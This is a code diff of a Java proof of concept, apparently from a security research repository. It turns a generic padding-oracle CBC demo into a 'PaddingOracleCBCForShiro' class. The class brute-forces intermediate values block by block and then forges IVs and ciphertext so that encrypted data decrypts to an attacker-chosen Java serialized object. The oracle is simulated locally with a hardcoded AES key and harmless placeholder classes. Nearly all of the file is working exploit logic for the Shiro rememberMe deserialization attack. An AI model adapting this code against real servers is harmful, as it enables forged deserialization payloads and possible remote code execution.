@@ -1,56 +1,119 @@
 package com.threedr3am.bug.paddingoraclecbc;
 
-import com.vip.vjtools.vjkit.security.CryptoUtil;
+import com.vip.vjtools.vjkit.base.ExceptionUtil;
 import com.vip.vjtools.vjkit.text.EncodeUtil;
+import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
+import java.io.IOException;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.io.Serializable;
+import java.security.GeneralSecurityException;
 import java.util.Arrays;
 import java.util.function.Predicate;
+import javax.crypto.Cipher;
+import javax.crypto.SecretKey;
+import javax.crypto.spec.IvParameterSpec;
+import javax.crypto.spec.SecretKeySpec;
 
 /**
  * padding oracle cbc java实现（多组密文实现）
  *
- * todo 用于padding oracle爆破多组密文的原文，然后cbc攻击修改每一段iv，使密文解密可以变成我们预期的明文
+ * 原密文及iv解密出序列化数据，并且解密后的序列化数据可以被正确反序列化，根据java反序列化以队列形式读取进行的原理，在其后不断拼接两组数据（iv+crypt）去padding oracle
+ * cbc为期望的序列化数据，只要padding成功即意味着能被反序列化，直到最后把原来的iv和密文去掉，留下新的iv额密文
  *
  * @author threedr3am
  */
-public class PaddingOracleCBC2 {
+class AAA implements Serializable {
 
-  public static void main(String[] args) {
+  public AAA() {
+    System.out.println("AAA()...");
+  }
+}
+
+class BBB implements Serializable {
+
+  public BBB() {
+    System.out.println("BBB()...");
+  }
+}
+
+public class PaddingOracleCBCForShiro {
+
+
+  public static void main(String[] args) throws IOException, ClassNotFoundException {
     //aes iv
     String aesIv = "BSiv194+mpLpYJDOsuuBYA==";
     //aes key
     String aesKey = "e/ACMnCbFqab+v/cCIv3gA==";
-    //原文
-    String plain = "1dmin1dmin1dmin1dmin1dmin1dmin1dmin1dmin";
-    //cbc攻击，最后期望服务器解密出的结果
-    String cbcRes = "adminadminadminadminadminadminadminadmin";
 
-    //密文bytes
-    byte[] cryptTextBytes = CryptoUtil.aesEncrypt(plain.getBytes(), EncodeUtil.decodeBase64(aesKey), EncodeUtil.decodeBase64(aesIv));
+    //原文
+    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
+    ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
+    objectOutputStream.writeObject(new AAA());
+    objectOutputStream.flush();
+    objectOutputStream.close();
+    byte[] plain = byteArrayOutputStream.toByteArray();
+    System.out.println(new String(plain));
+    printBytes(plain);
+
+    //cbc攻击，最后期望服务器解密出的结果
+    ByteArrayOutputStream byteArrayOutputStream2 = new ByteArrayOutputStream();
+    ObjectOutputStream objectOutputStream2 = new ObjectOutputStream(byteArrayOutputStream2);
+    objectOutputStream2.writeObject(new BBB());
+    objectOutputStream2.flush();
+    objectOutputStream2.close();
+    byte[] cbcRes = byteArrayOutputStream2.toByteArray();
+    System.out.println(new String(cbcRes));
+    printBytes(cbcRes);
+
     //aes iv bytes
     byte[] ivBytes = EncodeUtil.decodeBase64(aesIv);
+    //aes key bytes
+    byte[] keyBytes = EncodeUtil.decodeBase64(aesKey);
+    //密文bytes
+    byte[] cryptTextBytes = aes(plain, keyBytes, ivBytes, 1);
 
-    CBCResult cbcResult = paddingOracleCBC(cryptTextBytes, ivBytes, cbcRes.getBytes(), data -> {
-      //前16bytes是iv
-      byte[] ivTmp = Arrays.copyOfRange(data, 0, 16);
-      //后16bytes是密文
-      byte[] cryptTmp = Arrays.copyOfRange(data, 16, 32);
+    new ObjectInputStream(new ByteArrayInputStream(aes(cryptTextBytes, keyBytes, ivBytes, 2)))
+        .readObject();
+
+    CBCResult cbcResult = paddingOracleCBC(cryptTextBytes, ivBytes, cbcRes, data -> {
+      //把原密文拼接在前面，因为java原生反序列化的机制导致，只要能padding成功，就必然会反序列化成功
+      byte[] crypt = new byte[cryptTextBytes.length + data.length];
+      System.arraycopy(cryptTextBytes, 0, crypt, 0, cryptTextBytes.length);
+      System.arraycopy(data, 0, crypt, cryptTextBytes.length, data.length);
       try {
-        CryptoUtil
-            .aesDecrypt(cryptTmp, EncodeUtil.decodeBase64(aesKey), ivTmp);
+        byte[] decryptBytes = aes(crypt, keyBytes, ivBytes, 2);
+        new ObjectInputStream(new ByteArrayInputStream(decryptBytes))
+            .readObject().getClass().getName();
         return true;
       } catch (Exception e) {
         return false;
       }
     });
 
-    System.out.println(CryptoUtil
-        .aesDecrypt(cbcResult.crypt, EncodeUtil.decodeBase64(aesKey), cbcResult.iv));
+    new ObjectInputStream(
+        new ByteArrayInputStream(aes(cbcResult.crypt, keyBytes, cbcResult.iv, 2)))
+        .readObject();
+  }
+
+  private static byte[] aes(byte[] input, byte[] key, byte[] iv, int mode) {
+    try {
+      SecretKey secretKey = new SecretKeySpec(key, "AES");
+      IvParameterSpec ivSpec = new IvParameterSpec(iv);
+      Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
+      cipher.init(mode, secretKey, ivSpec);
+      return cipher.doFinal(input);
+    } catch (GeneralSecurityException var7) {
+      throw ExceptionUtil.unchecked(var7);
+    }
   }
 
   /**
    * CBC Attack Result
    */
   public static class CBCResult {
+
     byte[] iv;
     byte[] crypt;
 
@@ -68,18 +131,16 @@ public class PaddingOracleCBC2 {
     }
   }
 
-  private static CBCResult paddingOracleCBC(byte[] cryptText, byte[] ivBytes, byte[] cbcResBytes, Predicate<byte[]> predicate) {
+  private static CBCResult paddingOracleCBC(byte[] cryptText, byte[] ivBytes, byte[] cbcResBytes,
+      Predicate<byte[]> predicate) {
 
     //填充期望结果长度为16字节的倍数
     cbcResBytes = padding(cbcResBytes);
     //该值为期望结果的组数-1，用于不断反向取出每组期望值去CBC攻击
     int cbcResGroup = cbcResBytes.length / 16;
     byte[] res = new byte[cbcResBytes.length];
-    //该值为密文的组数-1，用于取出最后一组密文和iv
-    int group = cryptText.length / 16;
-    //取出最后一段密文和其所需的iv
-    byte[] iv = group > 1 ? Arrays.copyOfRange(cryptText, (group - 2) * 16, (group - 1) * 16) : ivBytes;
-    byte[] crypt = Arrays.copyOfRange(cryptText, (group - 1) * 16, group * 16);
+    byte[] iv = new byte[16];
+    byte[] crypt = new byte[16];
 
     for (; cbcResGroup > 0; cbcResGroup--) {
       byte[] middle = paddingOracle(iv, crypt, predicate);
@@ -89,7 +150,7 @@ public class PaddingOracleCBC2 {
       System.out.println("[plain]:" + new String(plainTmp));
       byte[] cbcResTmp = Arrays.copyOfRange(cbcResBytes, (cbcResGroup - 1) * 16, cbcResGroup * 16);
       //构造新的iv，cbc攻击
-      byte[] ivBytesNew = cbcAttack(iv, crypt, cbcResTmp, plain);
+      byte[] ivBytesNew = cbcAttack(iv, cbcResTmp, plain);
       System.out.println("[cbc->plain]:" + new String(generatePlain(ivBytesNew, middle)));
 
       System.arraycopy(crypt, 0, res, (cbcResGroup - 1) * 16, 16);
@@ -103,16 +164,14 @@ public class PaddingOracleCBC2 {
 
   /**
    * unpadding
-   *
-   * @param res
-   * @return
    */
   private static byte[] unpadding(byte[] res) {
     int end = res[res.length - 1];
     if (end > 0 && end <= 16) {
       for (int i = 1; i <= end; i++) {
-        if (res[res.length - i] != end)
+        if (res[res.length - i] != end) {
           break;
+        }
       }
       for (int i = 1; i <= end; i++) {
         res[res.length - i] = ' ';
@@ -122,18 +181,10 @@ public class PaddingOracleCBC2 {
   }
 
   /**
-   * 原来的iv ^ middle = plain
-   * 构造新的iv ^ middle = 'admin' -> 新的iv = middle ^ 'admin' -> 新的iv = 原来的iv ^ plain ^ 'admin'
-   *
-   *
-   *
-   * @param iv
-   * @param cryptText
-   * @param cbcResBytesForPadding
-   * @param plainBytes
-   * @return
+   * 原来的iv ^ middle = plain 构造新的iv ^ middle = 'admin' -> 新的iv = middle ^ 'admin' -> 新的iv = 原来的iv ^
+   * plain ^ 'admin'
    */
-  private static byte[] cbcAttack(byte[] iv, byte[] cryptText, byte[] cbcResBytesForPadding,
+  private static byte[] cbcAttack(byte[] iv, byte[] cbcResBytesForPadding,
       byte[] plainBytes) {
     byte[] res = Arrays.copyOf(iv, iv.length);
     for (int i = 15; i >= 0; i--) {
@@ -165,12 +216,7 @@ public class PaddingOracleCBC2 {
   }
 
   /**
-   * 与原iv异或，生成原文
-   * 原来的iv ^ middle = plain
-   *
-   * @param ivBytesOld
-   * @param middles
-   * @return
+   * 与原iv异或，生成原文 原来的iv ^ middle = plain
    */
   private static byte[] generatePlain(byte[] ivBytesOld, byte[] middles) {
     byte[] res = new byte[ivBytesOld.length];
@@ -183,13 +229,11 @@ public class PaddingOracleCBC2 {
   /**
    * padding oracle 核心方法
    *
-   * @param iv
-   * @param crypt
    * @param predicate 该对象test方法用于校验是否正确，多数为调用远程服务器提交数据，根据返回来确定解密后的异或结果是否符合规则
    * @return 这一组数据的middle
    */
   private static byte[] paddingOracle(byte[] iv, byte[] crypt, Predicate<byte[]> predicate) {
-    byte[] data = new byte[iv.length+crypt.length];
+    byte[] data = new byte[iv.length + crypt.length];
     System.arraycopy(iv, 0, data, 0, iv.length);
     System.arraycopy(crypt, 0, data, iv.length, crypt.length);
     byte[] middle = new byte[16];
@@ -214,6 +258,11 @@ public class PaddingOracleCBC2 {
     }
 
     System.out.print("[middle]:");
+    printBytes(middle);
+    return middle;
+  }
+
+  private static void printBytes(byte[] middle) {
     for (int i = 0; i < middle.length; i++) {
       System.out.print((0xff & middle[i]));
       if (i != middle.length - 1) {
@@ -221,6 +270,5 @@ public class PaddingOracleCBC2 {
       }
     }
     System.out.println();
-    return middle;
   }
 }
